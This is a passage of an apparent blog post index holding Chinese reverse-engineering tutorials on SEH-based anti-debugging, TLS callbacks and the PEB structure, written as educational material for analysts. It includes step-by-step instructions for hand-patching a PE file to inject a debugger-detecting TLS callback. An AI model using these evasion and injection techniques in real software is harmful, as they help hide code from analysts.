FS:[0],ESP指令，查看栈窗口（用Ollydbg更清晰），出现了新生成的EXCEPTION_REGISTRATION_RECORD结构体（Next&#x3D;0019FF60，Handler&#x3D;0040105A）。新的异常处理器（0040105A）就这样添加到SEH链。\n\n\n通过x32dbg的SEH链窗口也可以看到新添加在顶端的异常处理器（0040105A）\n\n4.发生异常如果执行401019地址处的MOV DWORD PTR DS:[EAX],1指令，就会触发EXCEPTION_ACCESS_VIOLATION异常。此时程序处在调试之中，根据异常处理的顺序，OS会把控制权交给调试器（异常处理器（0040105A）未运行）。在0040105A地址处设置断点，然后按Shift+Run（Shift+F9）组合键，再将异常派送给被调试进程（seh.exe），调试器暂停在设置的断点处（0040105A）。如下图，被调试者会调用注册在自身SEH链中的异常处理器来处理异常。设置好断点后，接下来即可调试异常处理器。\n\n5.查看异常处理器参数栈中存储的参数调试SEH时，栈中存储的参数如下图所示：\n根据SEH异常处理函数（SEH函数）的定义\n123456EXCEPTION_DISPOSITION _except_handler(\tEXCEPTION_RECORD *pRecord,\tEXCEPTION_REGISTRATION_RECORD *pFrame,\tCONTEXT *pContext,\tPVOID pValue);\n\n第一个参数（ESP+4）是指向EXCEPTION_RECORD结构体的指针pRecord（0019F434）\n第二个参数（ESP+8）是指向EXCEPTION_REGISTRATION_RECORD结构体的指针pFrame（0019FF24）\n第三个参数（ESP+C）是指向CONTEXT结构体的指针pContext（0019F484）\n第四个参数（ESP+10）是pValue供系统内部使用，可忽略（0019F3BC）\n下面依次查看各参数的内容\n\n使用Ollydbg查看更清晰\n\n第一个参数第一个参数（ESP+4）是指向EXCEPTION_RECORD结构体的指针pRecord（0019F434），查看结构体中的数据，根据EXCEPTION_RECORD结构体的定义\n123456780: kd&gt; dt _EXCEPTION_RECORDntdll!_EXCEPTION_RECORD   +0x000 ExceptionCode    : Int4B   +0x004 ExceptionFlags   : Uint4B   +0x008 ExceptionRecord  : Ptr32 _EXCEPTION_RECORD   +0x00c ExceptionAddress : Ptr32 Void   +0x010 NumberParameters : Uint4B   +0x014 ExceptionInformation : [15] Uint4B\n\nExceptionCode（pRecord+0）为C0000005（EXCEPTION_ACCESS_VIOLATION），发生异常的代码地址ExceptionAddress（pRecord+0xc）为00401019（和前面发生异常的代码地址是一致的）\n\n第二个参数第二个参数（ESP+8）是指向EXCEPTION_REGISTRATION_RECORD结构体的指针pFrame（0019FF24），它是SEH链的起始地址。\n第三个参数第三个参数（ESP+C）是指向CONTEXT结构体的指针pContext（0019F484），查看pContext所指的地址空间，根据CONTEXT结构体的定义\n1234567891011121314151617181920212223242526270: kd&gt; dt _CONTEXTntdll!_CONTEXT   +0x000 ContextFlags     : Uint4B   +0x004 Dr0              : Uint4B   +0x008 Dr1              : Uint4B   +0x00c Dr2              : Uint4B   +0x010 Dr3              : Uint4B   +0x014 Dr6              : Uint4B   +0x018 Dr7              : Uint4B   +0x01c FloatSave        : _FLOATING_SAVE_AREA   +0x08c SegGs            : Uint4B   +0x090 SegFs            : Uint4B   +0x094 SegEs            : Uint4B   +0x098 SegDs            : Uint4B   +0x09c Edi              : Uint4B   +0x0a0 Esi              : Uint4B   +0x0a4 Ebx              : Uint4B   +0x0a8 Edx              : Uint4B   +0x0ac Ecx              : Uint4B   +0x0b0 Eax              : Uint4B   +0x0b4 Ebp              : Uint4B   +0x0b8 Eip              : Uint4B   +0x0bc SegCs            : Uint4B   +0x0c0 EFlags           : Uint4B   +0x0c4 Esp              : Uint4B   +0x0c8 SegSs            : Uint4B   +0x0cc ExtendedRegisters : [512] UChar\n\n\n\n特别需要注意的是Eip成员，它位于结构体偏移0xB8的位置，存储着发生异常的代码地址\n\n第四个参数第四个参数（ESP+10）是pValue供系统内部使用，可忽略（0019F3BC）\n6.调试异常处理器40105A地址处的异常处理器中存在着调试器检测代码，下面将进行具体分析：\n①根据前面的分析可知，[ESP+C]是异常处理器的第三个参数pContext的值，MOV ESI,DWORD PTR SS:[ESP+C]用于将pContext地址（0019F484）传送到ESI寄存器；\n②FS:[30]是PEB结构体的起始地址（0026D000），MOV EAX,DWORD PTR FS:[30]用于将PEB结构体的起始地址传递给EAX；然后CMP BYTE PTR DS:[EAX+2],1指令是读取[EAX+2]地址（0026D002）处的1各字节值与1比较，由于当前EAX保存的是PEB结构体的起始地址，所以[EAX+2]（0026D002）指的就是PEB.BeingDebugged成员，图中内存窗口可以看到其值为1，表示进程处于调试状态。\n③上面CMP命令中的2个比较对象不同，则执行JNZ&#x2F;JNE命令跳转。由于PEB.BeingDebugged的值为1，所以不跳转，即不执行该JNZ&#x2F;JNE指令。\nA.若程序非调试运行时，将执行JNZ&#x2F;JNE指令跳转到401076地址处（MOV DWORD PTR DS:[ESI+B8],seh.401039），由于当前ESI保存着CONTEXT结构体指针pContext的起始地址（0019F484），所以[ESI+B8]为pContext-&gt;Eip（当前值为异常发生代码地址401019），因此MOV DWORD PTR DS:[ESI+B8],seh.401039指令用来将pContext-&gt;Eip值更改为401039。异常处理器终止时，发生异常的线程会运行401039地址处的代码；\nB.若程序处于调试状态，则跳过该JNZ&#x2F;JNE指令，直接执行40106A地址处的指令（MOV DWORD PTR DS:[ESI+B8],seh.401023），由于当前ESI保存着CONTEXT结构体指针pContext的起始地址（0019F484），所以[ESI+B8]为pContext-&gt;Eip（当前值为异常发生代码地址401019），因此MOV DWORD PTR DS:[ESI+B8],seh.401023指令用来将pContext-&gt;Eip值更改为401023。异常处理器终止时，发生异常的线程会运行401023地址处的代码。\n\n④由于进程处于调试中，所以进程执行完40106A处的指令后会跳转到异常处理器的终止代码401080处（JMP seh.401080），XOR EAX,EAX指令用于将返回值（EAX）设置为0，然后异常处理器返回。返回值0代表EXCEPTION_CONTINUE_EXECUTION，表示异常得到处理，相关线程可以继续运行。\n运行到401082地址处的RET指令时，控制权返回至ntdll.dll模块的代码区域，它属于系统区域，在x32dbg中按Run键后，调试会在401023地址处（已预先设置断点）暂停\n\n\n⑤调试器暂停在401023地址处后，继续运行401031处的CALL DWORD PTR DS:[&lt;&amp;MessageBoxA&gt;]指令，弹出一个消息框。按”确定”按钮关闭消息框后，执行401037处的JMP seh.40104D指令，跳转到删除SEH的代码处（40104D）。\n\n7.删除SEH调试运行到40104D地址处后查看栈，EXCEPTION_REGISTRATION_RECORD结构体存储在其中（0019FF24），该结构体是SEH链中最初运行的异常处理器。40104D处的POP DWORD PTR FS:[0]指令用来读取栈值（0019FF60），并将其放入FS:[0]。FS:[0]是TEB.NtTib.ExceptionList，0019FF60就是下一个SEH的起始地址。执行该指令后，前面注册的SEH（0019FF24）被从SEH链中删除。然后执行401054地址处的ADD ESP,4指令，将栈中的异常处理器地址（40105A）也删除。\n\n设置OllyDbg选项本章最重要、最关键的内容概括起来就是通过处理使被调试者将自身异常首先发送给调试器。\n程序在正常运行与调试运行时有不同的分支代码，借助SEH实现的反调试技术非常多，这为代码调试带来诸多不便。Ollydbg调试器提供了调试选项。调试中的程序发生异常时，调试器不会暂停，会自动将异常派送给被调试者（看上去与正常运行一样）。\n\n忽略kernel32中发生的内存非法访问异常选中Ignore memory access violations in kernel32选项后，kernel32.dll模块中发生的内存非法访问异常都会被忽略。\n向被调试者派送异常Ignore(pass to program)following exceptions选项下存在多个异常复选框，前5个已经介绍过，选中后发生相应异常Ollydbg就会忽略该异常，并将其派送给被调试者。\n第六个异常，FPU（Floating Point Unit，浮点运算单元）是专门用于浮点数运算的处理器，选中后，处理FPU指令过程中发生异常时，调试器会无条件将异常派送给被调试者处理。\n![Ignore(pass to program)following exceptions选项](.&#x2F;SEH详细说明&#x2F;Ignore(pass to program)following exceptions选项.png)\n","slug":"SEH","date":"2022-04-20T08:19:17.000Z","categories_index":"","tags_index":"Windows异常处理机制","author_index":"0netry"},{"id":"66da80b7dfd28e13d279b8154dbcb5eb","title":"TLS回调函数","content":"TLS回调函数TLS（Thread Local Storage，线程局部存储）回调函数常用于反调试\nTLSTLS是各线程的独立的数据存储空间。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样（编程中这种功能非常有用）。\nTLS表若在编程中启用了TLS功能，PE头文件中就会设置TLS表（TLS Table）项目，如下图（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]），IMAGE_TLS_DIRECTORY结构体就位于RVA 9310地址处\n\nIMAGE_TLS_DIRECTORY1234567891011121314151617181920212223242526272829IMAGE_TLS_DIRECTORY结构体：typedef struct _IMAGE_TLS_DIRECTORY64&#123;\tULONGLONG StartAddressOfRawData;\tULONGLONG EndAddressOfRawData;\tULONGLONG AddressOfIndex;                   // PDWORD\tULONGLONG AddressOfCallBacks;               // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY64;typedef IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32&#123;\tDWORD StartAddressOfRawData;\tDWORD EndAddressOfRawData;\tDWORD AddressOfIndex;                       // PDWORD\tDWORD AddressOfCallBacks;                   // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY64 PIMAGE_TLS_DIRECTORY;#elsetypedef IMAGE_TLS_DIRECTORY32 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY32 PIMAGE_TLS_DIRECTORY;#endif\n\n使用ExeInfoPe查看IMAGE_TLS_DIRECTORY结构体：\n\n逆向分析中比较重要的成员为AddressOfCallBacks，该值指向含有TLS回调函数地址（VA）的数组。这意味着可以向同一程序注册多个TLS回调函数（数组以NULL值结束）。\n回调函数地址数组该数组中实际存储的就是TLS回调函数的地址。进程启动运行时，（执行EP代码前）系统会逐一调用存储在该数组中的函数。请注意，可以通过修改程序注册多个TLS函数。\n下面使用ExeInfoPe查看回调函数地址数组（由前面已知示例程序回调函数地址为408114），可以看到示例中只注册了一个TLS函数（地址为401000）\n\nTLS回调函数所谓TLS回调函数是指，每当创建&#x2F;终止进程的线程时会自动调用执行的函数。有意思的是，创建进程的主线程时也会自动调用回调函数，且其调用执行先于EP代码。反调试技术利用的就是TLS回调函数的这一特征。\n请注意，创建或终止某线程时，TLS回调函数都会自动调用执行，前后共2次（原意即为此）。执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先被调用执行，许多逆向分析人员将该特征应用于程序的反调试技术。\nIMAGE_TLS_CALLBACK1234567TLS Callback函数定义typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK)(    PVOID DllHandle,    DWORD Reason,    PVOID Reserved);\n\n它与DllMain函数定义相似\n1234567DllMain函数定义BOOL WINAPI DllMain(    __in HINSTANCE hinstDLL,    __in DWORD fdwReason,    __in LPVOID lpvReserved);\n\n观察以上两个函数，发现它们的参数顺序与含义是一样的。其中，参数DllHandle为模块句柄（即加载地址），参数Reason表示调用TLS回调函数的原因，具体原因有四种：\n1234#define DLL_PROCESS_ATTACH 1#define DLL_THREAD_ATTACH  2#define DLL_THREAD_DETACH  3#define DLL_PROCESS_DETACH 0\n\nDLL_PROCESS_ATTACH进程的主线程调用main()函数前，已经注册的TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2）会先被调用执行，此时Reason的值为1（DLL_PROCESS_ATTACH）\nDLL_THREAD_ATTACH所有TLS回调函数完成调用后，main()函数开始调用执行，创建用户线程（ThreadProc）前，TLS回调函数会被再次调用执行，此时Reason&#x3D;2（DLL_THREAD_ATTACH）\nDLL_THREAD_DETACHTLS回调函数全部执行完毕后，ThreadProc()线程函数开始调用执行。其执行完毕后Reason&#x3D;3（DLL_THREAD_DETACH），TLS回调函数被调用执行。\nDLL_PROCESS_DETACHThreadProc()线程函数执行完毕后，一直在等待线程终止的main()函数（主线程）也会终止。此时Reason&#x3D;0（DLL_PROCESS_DETACH），TLS回调函数最后一次被调用执行。\n练习：TlsTest.exe1.TlsTest.cpp\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123;    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    print_console(&quot;ThreadProc() start\\n&quot;);    print_console(&quot;ThreadProc() end\\n&quot;);    return 0;&#125;int main(void)&#123;    HANDLE hThread = NULL;    print_console(&quot;main() start\\n&quot;);    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);    WaitForSingleObject(hThread, 60*1000);    CloseHandle(hThread);    print_console(&quot;main() end\\n&quot;);    return 0;&#125;\n\n以上TlsTest.cpp源代码中注册了2个TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2），功能是将DllHandle与Reason这两个参数的值输出到控制台，然后终止退出。main()函数用于创建用户线程（ThreadProc）后终止，main()与ThreadProc()内部分别将函数开始&#x2F;终止日志输出到控制台\n2.通过ExeInfoPe查看TlsTest.exe的回调函数地址数组，可以看到注册了两个回调函数（401000、401080）\n\n3.运行TlsTest.exe结果\n\n调试TLS回调函数若直接使用调试器打开带有TLS回调函数的程序，则无法调试TLS回调函数，因为TLS回调函数在EP代码之前就被调用执行了。此时修改调试器选项就可以调试TLS回调函数（见下图），然后重启调试器重新调试程序，调试器就会停在ntdll.dll模块内部的”System Startup Breakpoint”处暂停。调试器暂停的位置即是系统启动断点，使用ExeInfoPe查看的回调函数的地址，然后在回调函数的起始地址设置好断点，这样就可以调试TLS回调函数了。\n\n手动添加TLS回调函数下面以Hello.exe为例展示手动添加TLS回调函数使之能起到反调试的作用\n1.修改前的原程序如下图所示，修改前的原程序用x32dbg调试运行时也没有反调试功能，而是直接输出Hello:)\n\n2.设计规划首先要确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的哪个位置。向某个PE文件添加代码或数据时，有如下三种方法来查找合适的位置：\n1231）添加到节区末尾的空白区域2）增加最后一个节区的大小3）在最后添加新节区\n\n本例中采用第二种方法，即增加最后一个节区的大小。\n增加最后一个节区的大小①首先使用exeinfope查看Hello.exe最后一个节区（.rsrc）的节区头（注意，Hello.exe的Section Alignment&#x3D;1000h，File Alignment&#x3D;200h），可以看到最后一个节区（.rsrc）的Pointer to Raw Data&#x3D;9000h，Size of Raw Data&#x3D;200h。所以PE头定义的文件整体大小为9200h。考虑到要添加代码与数据的大小，将最后一个节区的大小增加200h（文件的大小增加到9400h）。\n\n\n\n\n\n\n\n\n\n\n图中Virtual Size为1B4，PE装载器会按照Section Alignment值对齐该值，即加载到内存中的大小为1000.所以将节区的文件大小增加200后，实际Virtual Size值变为3B4，它比加载到内存中的尺寸1000要小，所以不需要再单独增大Virtual Size的值。\n②使用010Editor（或HxD工具）打开Hello.exe文件，移动光标至最后位置，在菜单栏中选择Edit-&gt;Insert&#x2F;Overwrite-&gt;Insert Bytes，然后在弹框中选择Hex以显示16进制，向Size中输入200，单击Insert后，即从光标的当前位置新添加了200h个字节（即512个字节）\n\n\n\n\n3.编辑PE文件头.rsrc节区头使用010Editor修改.rsrc节区头中的Size Of Raw Data与Characteristics的值，即Size of Raw Data&#x3D;400h、Characteristics增加IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE属性（Characteristics&#x3D;E0000060）\n\n\n\n\n\n\n\n\n\n由于需要在扩展区域内创建IMAGE_TLS_DIRECTORY结构体与TLS回调函数，所以需要向该节区添加IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE属性。此外，还必须向包含IMAGE_TLS_DIRECTORY结构体的节区添加IMAGE_SCN_MEM_WRITE属性，才能保证正常运行。\n\n\nIMAGE_DATA_DIRECTORY[9]接下来要设置TLS表（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]）的值，根据前面的步骤，扩展区域的起始地址为9200h（文件偏移）。而原来.rsrs的起始地址为9000h，大小为200h，对应的RVA为C000h，所以9200h对应的RVA为9200h-9000h+C000h&#x3D;C200h。（计算公式RVA &#x3D; 目标文件偏移量 - 目标所在节区的起始偏移量 + 目标所在节区的起始 RVA，这里目标所在节区为.rsrc，通过010Editor可以查看该节区的起始偏移为9000h，起始RVA为C000h，所以9200h偏移对应的RVA&#x3D;9200h-9000h+C000h&#x3D;C200h，也可用Stud_PE的RVA&lt;&#x3D;&gt;RAW插件或Lord_PE的位置计算器来计算），接下来将从该地址处创建IMAGE_TLS_DIRECTORY结构体。因此在010Editor中修改IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]，使得RVA&#x3D;C200h，Size&#x3D;18h（TLS表大小为18h，即24）\n\n4.设置IMAGE_TLS_DIRECTORY接下来在文件偏移9200h（RVA C200）地址处设置IMAGE_TLS_DIRECTORY结构体，只要把TLS回调函数注册到其中即可。根据TLS表的结构\n12345678typedef struct _IMAGE_TLS_DIRECTORY32&#123;\tDWORD StartAddressOfRawData;\tDWORD EndAddressOfRawData;\tDWORD AddressOfIndex;                       // PDWORD\tDWORD AddressOfCallBacks;                   // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY32;\n\n可以从图中（红色方框）看出设置了：\n123456StartAddressOfRawData=0040C218EndAddressOfRawData=0040C21CAddressOfIndex=0040C220                      AddressOfCallBacks=0040C224                   SizeOfZeroFill=00000000Characteristics=00000000\n\n而根据文件偏移9200h对应的RVA为C200h，ImageBase为400000h，所以TLS回调函数地址数组所在地址40C224h对应的RVA为40C224h-400000h&#x3D;C224h，对应的文件偏移&#x3D;C224h-C200h+9200h&#x3D;9224h，即黄色方框位置，注册了一个TLS回调函数40C230h\nTLS回调函数对应的文件偏移&#x3D;40C230h-400000h-C200h+9200h&#x3D;9230h（即蓝色方框位置），这里先向该地址写入”C2 0C00 - RETN 0C”命令，即在TLS回调函数中不执行任何操作，直接返回。\n到此运行修改后的Hello.exe，若修改没问题，则能正常运行\n\n\n\n\n\n\n\n\n\nTLS回调函数的返回指令不是RETN，而是RETN 0C指令，因为函数有3个参数（大小为0C），所以需要修正栈，修正大小为0C。\n\n\n\n\n\n\n\n\n\n\n我按上面步骤操作但最后运行时发现运行不了，经过一番研究，发现原来使用010Editer编辑二进制时，如果在改字节过程中使用了删除键，则pe的字节也会被删除，我在编辑过程中使用了删除键，所以导致最后.rsrc节区的大小没有400，而raw data size前面已经填了400h，导致不一致，所以无法运行，此时需要看缺了多少字节，重新插入缺少的字节即可。\n5.编写TLS回调函数根据前面步骤修改PE后程序能正常运行，接下来就可以编写TLS回调函数了。\n①使用x32dbg打开Hello.exe，然后跳转到TLS回调函数地址处（前面注册了TLS回调函数的地址为40C230），使用汇编功能编写代码\n\n②编写如下图所示的反调试代码，然后分别修改40C270、40C280处为”TLS CallBack”、”Debugger Detected!”\n\n\n\n\n\n\n\n\n\n1）代码流程是：\n通过比较[esp+8]即TLS回调函数第二个参数Reason的值是否为1（DLL_PROCESS_ATTACH），若是，则获取peb.BeingDebugged成员的值是否为0，若为0表示正常运行（非调试运行），若不为0，则表示处于调试状态，则弹出消息框提示”Debugger Detected!”然后退出程序。\n2）MessageBoxA()与ExitProcess() API的IAT地址（分别为4080E8、408028）使用原Hello.exe的IAT中的即可。在编写汇编过程中直接Call 地址，x32dbg会自动求得API的地址并输入结果。如果要调用的API不在IAT中，那么编写代码时要复杂得多。\n\n③编写完代码和数据后，使用快捷键Ctrl+p（或菜单栏选择文件-&gt;补丁），在弹出的对话框中全选并选择修复文件，然后输入要保存的文件名（*.exe）即可\n\n④使用x32dbg运行已保存的修改的程序，可以看到弹框显示”Debugger Detected!”，单击”确定”后，程序停止运行，这表明手工添加TLS回调函数成功。\n\n","slug":"TLS回调函数","date":"2022-04-15T07:23:02.000Z","categories_index":"","tags_index":"逆向,TLS回调函数,PE结构","author_index":"0netry"},{"id":"716452a8f7139876fcd7d9fc7c5bbc0e","title":"认识PEB","content":"PEB（Process Environment Block，进程环境块）\nPEB存放进程信息的结构体。\nPEB 结构体的定义PEB结构体成员使用Windbg调试器命令dt _PEB或dt ntdll!_PEB获取PEB结构体的组成成员如下所示：\nWin7 x86中：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192930: kd&gt; dt _PEBntdll!_PEB   +0x000 InheritedAddressSpace : UChar   +0x001 ReadImageFileExecOptions : UChar   +0x002 BeingDebugged    : UChar   +0x003 BitField         : UChar   +0x003 ImageUsesLargePages : Pos 0, 1 Bit   +0x003 IsProtectedProcess : Pos 1, 1 Bit   +0x003 IsLegacyProcess  : Pos 2, 1 Bit   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit   +0x003 SpareBits        : Pos 5, 3 Bits   +0x004 Mutant           : Ptr32 Void   +0x008 ImageBaseAddress : Ptr32 Void   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : Ptr32 Void   +0x018 ProcessHeap      : Ptr32 Void   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : Ptr32 Void   +0x024 IFEOKey          : Ptr32 Void   +0x028 CrossProcessFlags : Uint4B   +0x028 ProcessInJob     : Pos 0, 1 Bit   +0x028 ProcessInitializing : Pos 1, 1 Bit   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit   +0x028 ReservedBits0    : Pos 5, 27 Bits   +0x02c KernelCallbackTable : Ptr32 Void   +0x02c UserSharedInfoPtr : Ptr32 Void   +0x030 SystemReserved   : [1] Uint4B   +0x034 AtlThunkSListPtr32 : Uint4B   +0x038 ApiSetMap        : Ptr32 Void   +0x03c TlsExpansionCounter : Uint4B   +0x040 TlsBitmap        : Ptr32 Void   +0x044 TlsBitmapBits    : [2] Uint4B   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void   +0x050 HotpatchInformation : Ptr32 Void   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void   +0x058 AnsiCodePageData : Ptr32 Void   +0x05c OemCodePageData  : Ptr32 Void   +0x060 UnicodeCaseTableData : Ptr32 Void   +0x064 NumberOfProcessors : Uint4B   +0x068 NtGlobalFlag     : Uint4B   +0x070 CriticalSectionTimeout : _LARGE_INTEGER   +0x078 HeapSegmentReserve : Uint4B   +0x07c HeapSegmentCommit : Uint4B   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B   +0x088 NumberOfHeaps    : Uint4B   +0x08c MaximumNumberOfHeaps : Uint4B   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void   +0x094 GdiSharedHandleTable : Ptr32 Void   +0x098 ProcessStarterHelper : Ptr32 Void   +0x09c GdiDCAttributeList : Uint4B   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : Uint4B   +0x0a8 OSMinorVersion   : Uint4B   +0x0ac OSBuildNumber    : Uint2B   +0x0ae OSCSDVersion     : Uint2B   +0x0b0 OSPlatformId     : Uint4B   +0x0b4 ImageSubsystem   : Uint4B   +0x0b8 ImageSubsystemMajorVersion : Uint4B   +0x0bc ImageSubsystemMinorVersion : Uint4B   +0x0c0 ActiveProcessAffinityMask : Uint4B   +0x0c4 GdiHandleBuffer  : [34] Uint4B   +0x14c PostProcessInitRoutine : Ptr32     void    +0x150 TlsExpansionBitmap : Ptr32 Void   +0x154 TlsExpansionBitmapBits : [32] Uint4B   +0x1d4 SessionId        : Uint4B   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER   +0x1e8 pShimData        : Ptr32 Void   +0x1ec AppCompatInfo    : Ptr32 Void   +0x1f0 CSDVersion       : _UNICODE_STRING   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP   +0x208 MinimumStackCommit : Uint4B   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO   +0x210 FlsListHead      : _LIST_ENTRY   +0x218 FlsBitmap        : Ptr32 Void   +0x21c FlsBitmapBits    : [4] Uint4B   +0x22c FlsHighIndex     : Uint4B   +0x230 WerRegistrationData : Ptr32 Void   +0x234 WerShipAssertPtr : Ptr32 Void   +0x238 pContextData     : Ptr32 Void   +0x23c pImageHeaderHash : Ptr32 Void   +0x240 TracingFlags     : Uint4B   +0x240 HeapTracingEnabled : Pos 0, 1 Bit   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit   +0x240 SpareTracingBits : Pos 2, 30 Bits\n\nWin10 x64中：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116kd&gt; dt ntdll!_PEB   +0x000 InheritedAddressSpace : UChar   +0x001 ReadImageFileExecOptions : UChar   +0x002 BeingDebugged    : UChar   +0x003 BitField         : UChar   +0x003 ImageUsesLargePages : Pos 0, 1 Bit   +0x003 IsProtectedProcess : Pos 1, 1 Bit   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit   +0x003 IsPackagedProcess : Pos 4, 1 Bit   +0x003 IsAppContainer   : Pos 5, 1 Bit   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit   +0x004 Padding0         : [4] UChar   +0x008 Mutant           : Ptr64 Void   +0x010 ImageBaseAddress : Ptr64 Void   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA   +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS   +0x028 SubSystemData    : Ptr64 Void   +0x030 ProcessHeap      : Ptr64 Void   +0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION   +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER   +0x048 IFEOKey          : Ptr64 Void   +0x050 CrossProcessFlags : Uint4B   +0x050 ProcessInJob     : Pos 0, 1 Bit   +0x050 ProcessInitializing : Pos 1, 1 Bit   +0x050 ProcessUsingVEH  : Pos 2, 1 Bit   +0x050 ProcessUsingVCH  : Pos 3, 1 Bit   +0x050 ProcessUsingFTH  : Pos 4, 1 Bit   +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit   +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit   +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit   +0x050 ReservedBits0    : Pos 8, 24 Bits   +0x054 Padding1         : [4] UChar   +0x058 KernelCallbackTable : Ptr64 Void   +0x058 UserSharedInfoPtr : Ptr64 Void   +0x060 SystemReserved   : Uint4B   +0x064 AtlThunkSListPtr32 : Uint4B   +0x068 ApiSetMap        : Ptr64 Void   +0x070 TlsExpansionCounter : Uint4B   +0x074 Padding2         : [4] UChar   +0x078 TlsBitmap        : Ptr64 Void   +0x080 TlsBitmapBits    : [2] Uint4B   +0x088 ReadOnlySharedMemoryBase : Ptr64 Void   +0x090 SharedData       : Ptr64 Void   +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void   +0x0a0 AnsiCodePageData : Ptr64 Void   +0x0a8 OemCodePageData  : Ptr64 Void   +0x0b0 UnicodeCaseTableData : Ptr64 Void   +0x0b8 NumberOfProcessors : Uint4B   +0x0bc NtGlobalFlag     : Uint4B   +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER   +0x0c8 HeapSegmentReserve : Uint8B   +0x0d0 HeapSegmentCommit : Uint8B   +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B   +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B   +0x0e8 NumberOfHeaps    : Uint4B   +0x0ec MaximumNumberOfHeaps : Uint4B   +0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void   +0x0f8 GdiSharedHandleTable : Ptr64 Void   +0x100 ProcessStarterHelper : Ptr64 Void   +0x108 GdiDCAttributeList : Uint4B   +0x10c Padding3         : 